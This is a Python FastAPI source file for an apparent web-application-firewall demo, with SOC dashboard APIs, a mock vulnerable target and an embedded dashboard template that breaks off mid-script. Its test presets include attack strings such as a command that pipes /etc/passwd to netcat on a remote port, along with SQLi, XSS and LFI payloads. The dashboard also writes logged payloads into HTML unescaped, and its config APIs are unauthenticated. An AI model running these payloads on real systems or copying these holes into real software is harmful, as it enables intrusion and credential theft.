import os
import sys
import json
import sqlite3
from datetime import datetime, timezone
from typing import Optional, List
from fastapi import FastAPI, Request, Query, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from ai_engine.model import AegisNeuralBrain
ai_brain = AegisNeuralBrain()

DB_PATH = os.path.join(BASE_DIR, "waf_data.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS waf_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        client_ip TEXT NOT NULL,
        method TEXT NOT NULL,
        path TEXT NOT NULL,
        headers TEXT,
        query_params TEXT,
        body_snippet TEXT,
        attack_type TEXT NOT NULL,
        rule_id TEXT NOT NULL,
        severity TEXT NOT NULL,
        action_taken TEXT NOT NULL,
        status_code INTEGER NOT NULL,
        blocked_reason TEXT
    )
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON waf_logs(timestamp)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_logs_attack_type ON waf_logs(attack_type)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_logs_action ON waf_logs(action_taken)")

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS waf_config (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
    )
    """)
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('mode', 'PREVENTION')")
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('rate_limit_rpm', '60')")
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('sqli_enabled', '1')")
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('xss_enabled', '1')")
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('rce_enabled', '1')")
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('lfi_enabled', '1')")
    cursor.execute("INSERT OR IGNORE INTO waf_config (key, value) VALUES ('bot_filter_enabled', '1')")
    conn.commit()
    conn.close()

init_db()

app = FastAPI(title="AegisGuard WAF - Cyber Defense Center & Target App")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ==============================================================================
# 1. SOC ANALYTICS & DASHBOARD APIS
# ==============================================================================

@app.get("/api/stats")
def get_stats():
    conn = get_db()
    cursor = conn.cursor()
    
    total = cursor.execute("SELECT COUNT(*) FROM waf_logs").fetchone()[0]
    blocked = cursor.execute("SELECT COUNT(*) FROM waf_logs WHERE action_taken = 'BLOCKED'").fetchone()[0]
    passed = cursor.execute("SELECT COUNT(*) FROM waf_logs WHERE action_taken = 'PASSED'").fetchone()[0]
    flagged = cursor.execute("SELECT COUNT(*) FROM waf_logs WHERE action_taken = 'FLAGGED'").fetchone()[0]

    threat_rows = cursor.execute("""
        SELECT attack_type, COUNT(*) as count 
        FROM waf_logs 
        WHERE attack_type != 'CLEAN' 
        GROUP BY attack_type 
        ORDER BY count DESC
    """).fetchall()
    threat_breakdown = {row["attack_type"]: row["count"] for row in threat_rows}

    top_ips = cursor.execute("""
        SELECT client_ip, COUNT(*) as count 
        FROM waf_logs 
        WHERE action_taken = 'BLOCKED' 
        GROUP BY client_ip 
        ORDER BY count DESC 
        LIMIT 5
    """).fetchall()
    top_attackers = [{"ip": row["client_ip"], "count": row["count"]} for row in top_ips]

    conn.close()
    return {
        "total_inspected": total,
        "blocked": blocked,
        "passed": passed,
        "flagged": flagged,
        "block_ratio": round((blocked / total * 100) if total > 0 else 0, 1),
        "threat_breakdown": threat_breakdown,
        "top_attackers": top_attackers
    }

@app.get("/api/logs")
def get_logs(limit: int = 50, attack_type: Optional[str] = None):
    conn = get_db()
    cursor = conn.cursor()
    if attack_type and attack_type != "ALL":
        query = "SELECT * FROM waf_logs WHERE attack_type = ? ORDER BY id DESC LIMIT ?"
        rows = cursor.execute(query, (attack_type, limit)).fetchall()
    else:
        query = "SELECT * FROM waf_logs ORDER BY id DESC LIMIT ?"
        rows = cursor.execute(query, (limit,)).fetchall()
    
    result = [dict(row) for row in rows]
    conn.close()
    return result

@app.get("/api/config")
def get_config():
    conn = get_db()
    cursor = conn.cursor()
    rows = cursor.execute("SELECT key, value FROM waf_config").fetchall()
    conn.close()
    return {row["key"]: row["value"] for row in rows}

class ConfigUpdate(BaseModel):
    key: str
    value: str

@app.post("/api/config")
def update_config(item: ConfigUpdate):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO waf_config (key, value) VALUES (?, ?)", (item.key, item.value))
    conn.commit()
    conn.close()
    return {"status": "success", "updated": {item.key: item.value}}

@app.post("/api/logs/clear")
def clear_logs():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM waf_logs")
    conn.commit()
    conn.close()
    return {"status": "cleared"}

# ==============================================================================
# 1.6 ANTI-DDOS & CLOUDFLARE SHIELD MANAGEMENT APIS
# ==============================================================================

import urllib.request

WAF_PROXY_URL = "http://127.0.0.1:8080"

@app.get("/api/ddos/status")
def get_ddos_status():
    try:
        req = urllib.request.Request(f"{WAF_PROXY_URL}/__aegis_ddos/status", headers={"User-Agent": "AegisSOC/1.0"})
        with urllib.request.urlopen(req, timeout=1.5) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return {
            "under_attack_mode": False,
            "global_rps": 0,
            "surge_threshold_rps": 80,
            "total_challenges_issued": 0,
            "total_challenges_solved": 0,
            "total_blocked_ddos": 0,
            "jailed_ips_count": 0,
            "jailed_ips": [],
            "error": str(e)
        }

@app.post("/api/ddos/toggle")
def toggle_ddos_mode(enabled: Optional[bool] = None):
    try:
        url = f"{WAF_PROXY_URL}/__aegis_ddos/toggle"
        if enabled is not None:
            url += f"?enable={1 if enabled else 0}"
        req = urllib.request.Request(url, headers={"User-Agent": "AegisSOC/1.0"})
        with urllib.request.urlopen(req, timeout=1.5) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

@app.post("/api/ddos/unban")
def unban_ddos_ip(ip: str = Query(...)):
    try:
        url = f"{WAF_PROXY_URL}/__aegis_ddos/unban?ip={ip}"
        req = urllib.request.Request(url, headers={"User-Agent": "AegisSOC/1.0"})
        with urllib.request.urlopen(req, timeout=1.5) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

# ==============================================================================
# 2. AI NEURAL THREAT DETECTION & ZERO-DAY PREDICTION API
# ==============================================================================

class AIPredictRequest(BaseModel):
    payload: str

@app.post("/api/ai/predict")
def api_ai_predict_post(req: AIPredictRequest):
    return ai_brain.predict(req.payload)

@app.get("/api/ai/predict")
def api_ai_predict_get(payload: str = ""):
    return ai_brain.predict(payload)

# ==============================================================================
# 2. VULNERABLE TARGET APPLICATION (MOCK BACKEND FOR LIVE DEMO)
#    Listens for requests forwarded by the Rust WAF Proxy (e.g. at /target/...)
# ==============================================================================

@app.get("/")
@app.get("/dashboard")
def home():
    return HTMLResponse(content=DASHBOARD_HTML)

@app.get("/motion")
@app.get("/showcase")
@app.get("/ad")
@app.get("/promo")
@app.get("/commercial")
@app.get("/cloudflare")
def motion_showcase():
    candidates = [
        os.path.join(BASE_DIR, "showcase", "index.html"),
        os.path.join(BASE_DIR, "rokh_motion_cloudflare.html"),
    ]
    for motion_path in candidates:
        if os.path.exists(motion_path):
            with open(motion_path, "r", encoding="utf-8") as f:
                html = f.read()
            return HTMLResponse(content=html)
    return HTMLResponse(content="<h1>Rokh Motion file not found</h1>", status_code=404)

@app.get("/video/commercial")
@app.get("/video/ad")
def stream_commercial_video():
    candidates = [
        os.path.join(BASE_DIR, "showcase", "media", "waf_commercial_ad.mp4"),
        os.path.join(BASE_DIR, "waf_commercial_ad.mp4"),
    ]
    for video_path in candidates:
        if os.path.exists(video_path):
            return FileResponse(video_path, media_type="video/mp4", filename="waf_commercial_ad.mp4")
    raise HTTPException(status_code=404, detail="Commercial video MP4 not found")

@app.get("/target/search")
def target_search(q: str = ""):
    # Simulates a vulnerable query search endpoint
    return {
        "status": "success",
        "backend": "Python Vulnerable Target v1.0",
        "message": f"Processed search query successfully: {q}",
        "raw_query": q,
        "results": [
            {"id": 1, "title": "Cybersecurity Fundamentals", "category": "defense"},
            {"id": 2, "title": "Web Application Firewalls (WAF) Deep Dive", "category": "engineering"}
        ]
    }

@app.post("/target/login")
async def target_login(request: Request):
    try:
        body = await request.json()
    except Exception:
        body = {}
    return {
        "status": "authenticated",
        "backend": "Python Target Auth Service",
        "user_received": body.get("username", "anonymous"),
        "timestamp": datetime.now(timezone.utc).isoformat()
    }

@app.get("/target/view-file")
def target_view_file(file: str = "notes.txt"):
    return {
        "status": "file_read_success",
        "file_requested": file,
        "content": f"Dummy content for safe file: {file}"
    }

# ==============================================================================
# 3. EMBEDDED DASHBOARD HTML TEMPLATE (SELF-CONTAINED & RESPONSIVE)
# ==============================================================================

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AegisGuard WAF - Security Operations Center (SOC)</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --bg-dark: #0a0e17;
            --card-bg: #121826;
            --border-color: #1e293b;
            --accent-cyan: #06b6d4;
            --accent-blue: #3b82f6;
            --accent-red: #ef4444;
            --accent-green: #10b981;
            --accent-yellow: #f59e0b;
            --text-main: #f1f5f9;
            --text-muted: #94a3b8;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; padding: 24px; }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 20px; border-bottom: 1px solid var(--border-color); }
        .header-title { display: flex; align-items: center; gap: 12px; }
        .shield-icon { font-size: 28px; filter: drop-shadow(0 0 10px rgba(6, 182, 212, 0.5)); }
        .badge-live { background: rgba(16, 185, 129, 0.15); color: var(--accent-green); border: 1px solid var(--accent-green); padding: 4px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
        
        .grid-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin: 24px 0; }
        .stat-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; position: relative; overflow: hidden; }
        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--accent-blue); }
        .stat-card.red::before { background: var(--accent-red); }
        .stat-card.green::before { background: var(--accent-green); }
        .stat-card.cyan::before { background: var(--accent-cyan); }
        .stat-label { font-size: 13px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
        .stat-value { font-size: 32px; font-weight: 700; margin-top: 8px; color: var(--text-main); }
        
        .main-layout { display: grid; grid-template-columns: 2fr 1fr; gap: 24px; }
        @media (max-width: 1024px) { .main-layout { grid-template-columns: 1fr; } }
        
        .panel { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 24px; }
        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
        .panel-title { font-size: 16px; font-weight: 600; color: var(--accent-cyan); }
        
        /* Attack Simulator Panel */
        .sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn-attack { background: #1e293b; border: 1px solid #334155; color: #fff; padding: 10px 14px; border-radius: 8px; cursor: pointer; text-align: left; font-size: 13px; transition: all 0.2s; display: flex; flex-direction: column; gap: 4px; }
        .btn-attack:hover { background: #334155; border-color: var(--accent-cyan); transform: translateY(-1px); }
        .btn-attack span.desc { font-size: 11px; color: var(--text-muted); }
        
        /* Tables */
        .table-wrap { overflow-x: auto; max-height: 480px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { text-align: left; padding: 12px 10px; background: #0f172a; color: var(--text-muted); font-weight: 600; position: sticky; top: 0; z-index: 10; border-bottom: 1px solid var(--border-color); }
        td { padding: 10px; border-bottom: 1px solid #1a2234; color: #cbd5e1; vertical-align: middle; }
        tr:hover { background: rgba(30, 41, 59, 0.5); }
        
        .tag { padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; display: inline-block; }
        .tag-blocked { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.4); }
        .tag-passed { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.4); }
        .tag-sqli { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
        .tag-xss { background: rgba(168, 85, 247, 0.15); color: #a855f7; }
        .tag-rce { background: rgba(239, 68, 68, 0.2); color: #f87171; }
        .tag-lfi { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
        .tag-bot { background: rgba(236, 72, 153, 0.15); color: #f472b6; }
        .tag-rate { background: rgba(251, 146, 60, 0.15); color: #fb923c; }

        .btn-clear { background: transparent; border: 1px solid #475569; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; }
        .btn-clear:hover { background: rgba(239, 68, 68, 0.15); color: var(--accent-red); border-color: var(--accent-red); }
        
        .code-payload { font-family: monospace; background: #090d16; padding: 2px 6px; border-radius: 4px; color: #e2e8f0; max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: inline-block; }
        
        /* AI Neural Inspector Panel */
        .ai-panel { background: linear-gradient(135deg, #121826 0%, #171b30 100%); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; padding: 20px; margin-bottom: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .ai-panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .ai-title { font-size: 16px; font-weight: 700; color: #c084fc; display: flex; align-items: center; gap: 8px; }
        .ai-badge { background: rgba(168, 85, 247, 0.2); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.5); font-size: 11px; padding: 3px 8px; border-radius: 6px; font-weight: 600; }
        .ai-input-row { display: flex; gap: 10px; margin-bottom: 12px; }
        .ai-input { flex: 1; background: #090d16; border: 1px solid #334155; color: #fff; padding: 10px 14px; border-radius: 8px; font-size: 13px; outline: none; transition: border-color 0.2s; font-family: monospace; }
        .ai-input:focus { border-color: #a855f7; }
        .btn-ai-scan { background: linear-gradient(135deg, #a855f7, #6366f1); border: none; color: #fff; padding: 10px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: transform 0.1s; white-space: nowrap; }
        .btn-ai-scan:hover { transform: scale(1.02); }
        .ai-pills { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
        .ai-pill { background: #1e293b; border: 1px solid #334155; color: #94a3b8; font-size: 11px; padding: 4px 10px; border-radius: 999px; cursor: pointer; transition: all 0.2s; }
        .ai-pill:hover { background: #334155; color: #fff; border-color: #a855f7; }
        .ai-results-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-top: 10px; }
        .ai-metric-box { background: rgba(15, 23, 42, 0.7); border: 1px solid #1e293b; border-radius: 8px; padding: 12px; }
        .ai-metric-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
        .ai-metric-val { font-size: 18px; font-weight: 700; margin-top: 4px; color: #fff; }
        .gauge-bar-bg { width: 100%; height: 6px; background: #1e293b; border-radius: 4px; overflow: hidden; margin-top: 6px; }
        .gauge-bar-fill { height: 100%; width: 0%; background: #10b981; transition: width 0.3s, background-color 0.3s; }

        /* Cloudflare-Grade Anti-DDoS Center */
        .ddos-panel { background: linear-gradient(135deg, #101625 0%, #1a1528 100%); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 12px; padding: 20px; margin-bottom: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .ddos-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
        .ddos-title { font-size: 16px; font-weight: 700; color: #fbbf24; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
        .badge-normal { background: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid #10b981; font-size: 11px; padding: 4px 10px; border-radius: 999px; font-weight: 700; }
        .badge-attack { background: rgba(239, 68, 68, 0.25); color: #ef4444; border: 1px solid #ef4444; font-size: 11px; padding: 4px 10px; border-radius: 999px; font-weight: 700; animation: pulse 1s infinite; }
        .btn-ddos-toggle { background: linear-gradient(135deg, #f59e0b, #d97706); border: none; color: #fff; padding: 8px 16px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: transform 0.1s, opacity 0.2s; }
        .btn-ddos-toggle:hover { transform: scale(1.02); opacity: 0.95; }
        .ddos-metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-top: 14px; }
        .ddos-metric-card { background: rgba(15, 23, 42, 0.75); border: 1px solid #1e293b; border-radius: 8px; padding: 14px; text-align: left; }
        .ddos-metric-lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
        .ddos-metric-num { font-size: 22px; font-weight: 700; color: #fff; margin: 4px 0 2px; }
        .jail-pill { display: inline-flex; align-items: center; gap: 8px; background: rgba(236, 72, 153, 0.15); border: 1px solid #db2777; color: #f472b6; padding: 4px 10px; border-radius: 6px; font-size: 12px; font-family: monospace; }
        .btn-unban { background: #db2777; border: none; color: #fff; border-radius: 4px; padding: 2px 6px; font-size: 10px; cursor: pointer; }
        .btn-unban:hover { background: #be185d; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-title">
            <span class="shield-icon">🏰</span>
            <div>
                <h1>Rokh Cloud WAF (دیوار آتش ابری رُخ)</h1>
                <p style="font-size: 13px; color: var(--text-muted);">Cloudflare-Grade Rust Engine & Enterprise Security Operations</p>
            </div>
        </div>
        <div style="display: flex; gap: 12px; align-items: center;">
            <a href="/motion" target="_blank" style="text-decoration:none;">
                <button class="btn-clear" style="background:linear-gradient(135deg,rgba(246,130,31,0.2),rgba(99,102,241,0.2));border:1px solid #f6821f;color:#fed7aa;font-weight:700;display:flex;align-items:center;gap:8px;cursor:pointer;padding:8px 18px;box-shadow:0 0 18px rgba(246,130,31,0.25);">
                    <span>🎬</span> موشن گرافیک ابری رُخ (Cloudflare Style)
                </button>
            </a>
            <span class="badge-live">● ENGINE LIVE</span>
            <button class="btn-clear" onclick="clearLogs()">Clear Logs</button>
        </div>
    </div>

    <div class="grid-stats">
        <div class="stat-card cyan">
            <div class="stat-label">Total Inspected Requests</div>
            <div class="stat-value" id="stat-total">0</div>
        </div>
        <div class="stat-card red">
            <div class="stat-label">Blocked Threats</div>
            <div class="stat-value" id="stat-blocked" style="color: var(--accent-red);">0</div>
        </div>
        <div class="stat-card green">
            <div class="stat-label">Clean / Passed Traffic</div>
            <div class="stat-value" id="stat-passed" style="color: var(--accent-green);">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Block Efficacy Ratio</div>
            <div class="stat-value" id="stat-ratio">0%</div>
        </div>
    </div>

    <!-- AI Neural Threat Inspector -->
    <div class="ai-panel">
        <div class="ai-panel-header">
            <div class="ai-title">
                <span>🧠</span>
                <span>AegisGuard Neural Threat Engine (Zero-Day & Anomaly Classifier)</span>
            </div>
            <span class="ai-badge">⚡ &lt; 0.2ms ML Inference</span>
        </div>
        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
            Test any raw HTTP payload or zero-day mutation against the pre-trained N-gram and Shannon Entropy neural classifier:
        </p>
        <div class="ai-pills">
            <span style="font-size: 11px; color: var(--text-muted); align-self: center;">Quick Presets:</span>
            <button class="ai-pill" onclick="loadAiPreset('admin\' OR \'x\'=\'x\'--')">Zero-Day SQLi</button>
            <button class="ai-pill" onclick="loadAiPreset('&lt;svg/onload=eval(atob(\'YWxlcnQoMSk=\'))&gt;')">Obfuscated XSS</button>
            <button class="ai-pill" onclick="loadAiPreset('php://filter/convert.base64-encode/resource=index.php')">PHP Wrapper LFI</button>
            <button class="ai-pill" onclick="loadAiPreset('; cat /etc/passwd | nc 10.0.0.1 4444')">Reverse Shell RCE</button>
            <button class="ai-pill" onclick="loadAiPreset('how to optimize database queries in postgresql')">Legitimate Query</button>
        </div>
        <div class="ai-input-row">
            <input type="text" id="ai-input" class="ai-input" placeholder="Enter query string, parameter, or payload to inspect with AI..." value="admin' OR '1'='1" />
            <button class="btn-ai-scan" onclick="analyzeAI()">⚡ Scan with AI</button>
        </div>

        <div class="ai-results-grid">
            <div class="ai-metric-box">
                <div class="ai-metric-label">Threat Confidence</div>
                <div class="ai-metric-val" id="ai-prob-val">0.0%</div>
                <div class="gauge-bar-bg">
                    <div id="ai-prob-bar" class="gauge-bar-fill"></div>
                </div>
            </div>
            <div class="ai-metric-box">
                <div class="ai-metric-label">AI Classification Verdict</div>
                <div class="ai-metric-val" id="ai-verdict-val" style="font-size: 15px; margin-top: 6px; color: var(--text-muted);">AWAITING SCAN</div>
            </div>
            <div class="ai-metric-box">
                <div class="ai-metric-label">Shannon Information Entropy</div>
                <div class="ai-metric-val" id="ai-entropy-val">0.00 bits</div>
            </div>
            <div class="ai-metric-box">
                <div class="ai-metric-label">Detected Intent / Latency</div>
                <div class="ai-metric-val" id="ai-intent-val" style="font-size: 14px; color: #38bdf8; margin-top: 6px;">-</div>
            </div>
        </div>
    </div>

    <!-- Cloudflare-Grade Anti-DDoS Center -->
    <div class="ddos-panel">
        <div class="ddos-header">
            <div class="ddos-title">
                <span>🛡️</span>
                <span>AegisGuard Cloudflare-Grade Anti-DDoS &amp; Traffic Surge Shield</span>
                <span id="ddos-mode-badge" class="badge-normal">🟢 NORMAL DEFENSE</span>
            </div>
            <div style="display: flex; gap: 10px; align-items: center;">
                <button id="btn-toggle-attack-mode" class="btn-ddos-toggle" onclick="toggleUnderAttackMode()">
                    🔥 Toggle "Under Attack Mode"
                </button>
            </div>
        </div>
        <p style="font-size: 12px; color: var(--text-muted); margin: 8px 0 16px;">
            Mitigates Layer 7 HTTP floods &amp; botnets using <strong>Cryptographic Proof-of-Work (PoW) JS Challenges</strong>, <strong>Dynamic IP Jails</strong>, and <strong>Sub-millisecond Asymmetric Defense</strong> without needing giant datacenters.
        </p>
        <div class="ddos-metrics-grid">
            <div class="ddos-metric-card">
                <div class="ddos-metric-lbl">Current Traffic Load</div>
                <div class="ddos-metric-num" id="ddos-rps" style="color: #38bdf8;">0 RPS</div>
                <div style="font-size: 11px; color: #64748b;">Surge Trigger: 80 RPS</div>
            </div>
            <div class="ddos-metric-card">
                <div class="ddos-metric-lbl">PoW Challenges Issued</div>
                <div class="ddos-metric-num" id="ddos-challenges-issued" style="color: #f59e0b;">0</div>
                <div style="font-size: 11px; color: #64748b;">Browser puzzles served</div>
            </div>
            <div class="ddos-metric-card">
                <div class="ddos-metric-lbl">Verified Human Browsers</div>
                <div class="ddos-metric-num" id="ddos-challenges-solved" style="color: #10b981;">0</div>
                <div style="font-size: 11px; color: #64748b;">Clearance cookies issued</div>
            </div>
            <div class="ddos-metric-card">
                <div class="ddos-metric-lbl">DDoS Packets Dropped</div>
                <div class="ddos-metric-num" id="ddos-dropped" style="color: #ef4444;">0</div>
                <div style="font-size: 11px; color: #64748b;">Dropped in &lt; 0.05ms</div>
            </div>
            <div class="ddos-metric-card">
                <div class="ddos-metric-lbl">Active Jailed IPs</div>
                <div class="ddos-metric-num" id="ddos-jailed-count" style="color: #ec4899;">0</div>
                <div style="font-size: 11px; color: #64748b;">Rate-abuse blacklists</div>
            </div>
        </div>

        <!-- Jailed IPs list -->
        <div id="jailed-ips-container" style="display: none; margin-top: 14px; background: #0b0f19; border: 1px solid #1e293b; border-radius: 8px; padding: 12px;">
            <div style="font-size: 12px; font-weight: 600; color: #ec4899; margin-bottom: 8px;">🚫 Currently Jailed Attack IPs:</div>
            <div id="jailed-ips-list" style="display: flex; gap: 8px; flex-wrap: wrap;"></div>
        </div>
    </div>

    <div class="main-layout">
        <!-- Left: Live Incident Stream -->
        <div>
            <div class="panel">
                <div class="panel-header">
                    <span class="panel-title">📡 Real-Time Security Incident Feed</span>
                    <span style="font-size: 12px; color: var(--text-muted);">Auto-refreshes every 2s</span>
                </div>
                <div class="table-wrap">
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Status</th>
                                <th>Attack Vector</th>
                                <th>Client IP</th>
                                <th>Method / Path</th>
                                <th>Trigger Snippet</th>
                            </tr>
                        </thead>
                        <tbody id="logs-tbody">
                            <tr>
                                <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
                                    Awaiting incoming traffic... Run attack simulations or proxy requests through Port 8080.
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Right: Charts & Interactive Attack Simulator -->
        <div>
            <div class="panel">
                <div class="panel-header">
                    <span class="panel-title">🎯 Live Attack Simulator (One-Click Test)</span>
                </div>
                <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 14px;">
                    Test the WAF's real-time detection by launching standard attack vectors against the proxy (Port 8080):
                </p>
                <div class="sim-grid">
                    <button class="btn-attack" onclick="triggerAttack('sqli')">
                        <strong>SQL Injection</strong>
                        <span class="desc">' UNION SELECT username, password FROM users--</span>
                    </button>
                    <button class="btn-attack" onclick="triggerAttack('xss')">
                        <strong>Cross-Site Scripting</strong>
                        <span class="desc">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
                    </button>
                    <button class="btn-attack" onclick="triggerAttack('lfi')">
                        <strong>Path Traversal / LFI</strong>
                        <span class="desc">../../../../etc/passwd</span>
                    </button>
                    <button class="btn-attack" onclick="triggerAttack('rce')">
                        <strong>Command Injection / RCE</strong>
                        <span class="desc">; cat /etc/shadow | curl</span>
                    </button>
                    <button class="btn-attack" onclick="triggerAttack('bot')">
                        <strong>Malicious Scanner / Bot</strong>
                        <span class="desc">User-Agent: sqlmap/1.7.2#dev</span>
                    </button>
                    <button class="btn-attack" onclick="triggerAttack('clean')">
                        <strong>Legitimate Request</strong>
                        <span class="desc">GET /target/search?q=cybersecurity</span>
                    </button>
                    <button class="btn-attack" onclick="triggerDdosFlood()" style="grid-column: span 2; background: linear-gradient(135deg, #1e1b4b, #311042); border-color: #f59e0b;">
                        <strong style="color: #fbbf24;">💥 DDoS HTTP Flood Simulation (Burst 80 Requests)</strong>
                        <span class="desc" style="color: #cbd5e1;">Rapid flood to test Proof-of-Work challenge, auto-jail, and sub-millisecond packet drops</span>
                    </button>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <span class="panel-title">📊 Threat Vector Distribution</span>
                </div>
                <div style="height: 220px; display: flex; justify-content: center;">
                    <canvas id="threatChart"></canvas>
                </div>
            </div>
        </div>
    </div>

    <script>
        let threatChart = null;

        function initChart() {
            const ctx = document.getElementById('threatChart').getContext('2d');
            threatChart = new Chart(ctx, {
                type: 'doughnut',
                data: {
                    labels: ['SQLi', 'XSS', 'RCE', 'LFI', 'Bots', 'RateLimit'],
                    datasets: [{
                        data: [0, 0, 0, 0, 0, 0],
                        backgroundColor: ['#f59e0b', '#a855f7', '#ef4444', '#3b82f6', '#ec4899', '#fb923c'],
                        borderWidth: 0
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: { position: 'bottom', labels: { color: '#94a3b8', boxWidth: 12 } }
                    }
                }
            });
        }

        async function fetchStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('stat-total').innerText = data.total_inspected.toLocaleString();
                document.getElementById('stat-blocked').innerText = data.blocked.toLocaleString();
                document.getElementById('stat-passed').innerText = data.passed.toLocaleString();
                document.getElementById('stat-ratio').innerText = data.block_ratio + '%';

                const tb = data.threat_breakdown || {};
                threatChart.data.datasets[0].data = [
                    tb['SQL_INJECTION'] || 0,
                    tb['XSS'] || 0,
                    tb['COMMAND_INJECTION'] || 0,
                    tb['PATH_TRAVERSAL'] || 0,
                    tb['BAD_BOT'] || 0,
                    tb['RATE_LIMIT'] || 0
                ];
                threatChart.update();
            } catch (e) {
                console.error("Failed to fetch stats", e);
            }
        }

        async function fetchLogs() {
            try {
                const res = await fetch('/api/logs?limit=25');
                const logs = await res.json();
                const tbody = document.getElementById('logs-tbody');
                if (logs.length === 0) return;

                tbody.innerHTML = logs.map(log => {
                    const statusClass = log.action_taken === 'BLOCKED' ? 'tag-blocked' : 'tag-passed';
                    let vectorClass = 'tag-passed';
                    if (log.attack_type === 'SQL_INJECTION') vectorClass = 'tag-sqli';
                    if (log.attack_type === 'XSS') vectorClass = 'tag-xss';
                    if (log.attack_type === 'COMMAND_INJECTION') vectorClass = 'tag-rce';
                    if (log.attack_type === 'PATH_TRAVERSAL') vectorClass = 'tag-lfi';
                    if (log.attack_type === 'BAD_BOT') vectorClass = 'tag-bot';
                    if (log.attack_type === 'RATE_LIMIT') vectorClass = 'tag-rate';

                    const snippet = log.body_snippet || log.query_params || log.path;

                    return `
                        <tr>
                            <td style="color: var(--text-muted);">${log.timestamp.split('T')[1]?.substring(0, 8) || log.timestamp}</td>
                            <td><span class="tag ${statusClass}">${log.action_taken} (${log.status_code})</span></td>
                            <td><span class="tag ${vectorClass}">${log.attack_type}</span></td>
                            <td><code>${log.client_ip}</code></td>
